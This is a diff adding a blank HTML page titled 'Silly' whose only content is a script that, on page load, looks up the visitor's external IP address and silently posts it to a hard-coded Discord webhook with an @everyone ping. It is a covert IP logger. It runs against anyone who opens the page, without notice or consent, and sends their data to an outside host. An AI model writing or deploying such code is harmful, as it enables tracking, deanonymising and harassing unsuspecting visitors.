@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Silly</title>
+    <script>
+        async function getExternalIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip
+            } catch (error) {
+                console.error('Error fetching external IP:', error);
+                return 'Unable to fetch IP';
+            }
+        }
+        function sendToDiscord(message) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1367545016146460783/4f-wuBf6-Y5zByvdLmYPGIMkZ1dsRUjF1IwiZ5yNpHDU9ddKw7u48wtoBN-PWLCpxb1R';
+            
+            const payload = {
+                content: message
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Discord:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord:', error);
+            });
+        }
+        window.onload = async function() {
+            const ip = await getExternalIP()
+            const message = `@everyone IP Address: ${ip}`;
+
+            console.log('Sending to Discord:', message);
+            sendToDiscord(message)
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
